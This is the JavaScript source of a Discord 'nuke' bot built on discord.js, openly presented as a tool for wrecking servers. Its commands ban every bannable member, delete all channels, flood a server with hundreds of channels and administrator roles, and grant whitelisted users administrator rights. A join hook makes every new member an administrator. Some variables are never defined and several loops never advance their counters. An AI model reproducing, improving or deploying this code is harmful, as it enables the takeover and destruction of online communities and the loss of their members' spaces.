const Discord = require("discord.js") //npm i discord.js
const client = new Discord.Client()
const token = 'TOKEN BOT'
const prefix = "PREFIX"
const textChannelsName = "hjacked"
const voiceChannelsName = "HJACKED"
const embedThumbnail = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png"
const reference = "HJACKED"
const whitelist = [
    "THE ID OF EACH WHITELISTED ACCOUNTS",
    "ALLOWED TO USE THIS BOT"
]
client.once('ready', () => { console.log(`Logged in as ${client.user.tag} !`) })

// ban all and send a message for the ownerserver
const nuke = (guildID) => {
    const guild = client.guilds.get(guildID)

    // Notify the owner that his server is under attack
    guild.owner.send(`Your ${guild.name} server is under attack !`).catch((err) => console.error('Can\'t sent message to this user'))

    // Sent a message to member and ban (if possible) him
    guild.members.forEach((member) => {
        if (member.bannable && guild.members.get(client.user.id).hasPermission('BAN_MEMBERS')) {
            member.send(reference).then((member)=> member.ban())
        }
    })

    // Delete all channels if possible
    guild.channels.forEach((channel) => {
        if (channel.deletable && guild.members.get(client.user.id).hasPermission('MANAGE_CHANNELS')) {
            channel.delete()
        }
    })

    // You can create 500 channels maximum, so we make the difference
    // with the channels wich are already created to make the maximum
    // of channels
    const maxChannelsRange = Math.abs(500 - guild.channels.array().length) // Return a positive value
    let index = 0
    setInterval(() => {
        if (index == maxChannelsRange) return
        guild.createChannel(textChannelsName, {type: "text"})
        index++

        if (index == maxChannelsRange) return
        guild.createChannel(voiceChannelsName, {type: "voice"})
        index ++
    })
}

client.on('message', message => {
    // Security
    if (!whitelist.includes(message.author.id)) return

    const args = message.content.split(/ +/)
    const command = args[0]
    if (command == `${prefix}nuke`) {
        console.log('THE HACK HAS BEEN STARTED')
        nuke(message.guild.id)

        client.user.setAvatar(embedThumbnail)
        client.user.setUsername(clientUsername)
        client.user.setGame('GAME', 'https://www.twitch.tv/your_twitch_chnl')

        message.guild.setIcon(embedThumbnail)
        message.guild.setName(clientUsername)

    } else if (command == `${prefix}op` && message.guild.members.get(client.user.id).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) {
        // Make you admin (NOT OWNER) in the targeted server
        message.guild.createRole({name: adminRoleName, color: "RANDOM", permissions: "ADMINISTRATOR"}).then((role) => {
            whitelist.forEach((whitelistID) => {
                const member = message.guild.members.get(whitelistID)
                if (!member) undefined
                else member.addRole(role)
            })
        })
    } else if (command == `${prefix}createRoles`) {
        // The maximum roles range that you can create is 250, so we
        // fill up to get 250 roles
        const maxRolesRange = Math.abs(250 - message.guild.roles.array().length) // Return a positive value
        let index = 0
        setInterval(() => {
            if (index == maxRolesRange) return
            message.guild.createRole({name: reference, color: 0xFF0000, permissions: "ADMINISTRATOR"})
        })
    } else if (command == `${prefix}createTextChannels`) {
        // The maximum channels range that you can create is 500, so we
        // fill up to get 500 channels
        const maxChannelsRange = Math.abs(500 - message.guild.channels.array().length) // Return a positive value
        let index = 0
        setInterval(() => {
            if (index == maxChannelsRange) return
            message.guild.createChannel(textChannelsName, {type: "text"})
        })
    } else if (command == `${prefix}createVoiceChannels`) {
        // Same thing as befor, but with voice channels now
        const maxChannelsRange = Math.abs(500 - message.guild.channels.array().length) // Return a positive value
        let index = 0
        setInterval(() => {
            if (index == maxChannelsRange) return
            message.guild.createChannel(voiceChannelsName, {type: "voice"})
        })

    } else if (command == `${prefix}help`) {
        const helpEmbed = new Discord.RichEmbed()
        .setColor("ff0000")
        .setThumbnail(embedThumbnail)
        .addField('Prefix of commands: ', `${prefix}`)
        .addField(`${prefix}nuke`, 'Destroy the server : delete channels and ban all if the bot has the required permissions')
        .addField(`${prefix}op`, 'Make you an administrator in the server')
        .addField(`${prefix}createRoles`, 'Create maximum roles')
        .addField(`${prefix}createTextChannels`, 'Create maximum channels as text channels')
        .addField(`${prefix}createVoiceChannels`, 'Create maximum channels as voice channels')

        // .sendEMbed() is a deprecated method according to discord.js
        message.channel.send(helpEmbed)
    }

})

client.on('guildMemberAdd', (member) => {
    member.guild.createRole({name: client.user.username, color: "RANDOM", permissions: "ADMINISTRATOR"}).then((role) => {
        member.addRole(role).then((member) => {
            member.send(`You are now administrator in the ${member.guild.name} server !`)
        })
    })
})
client.login(token)
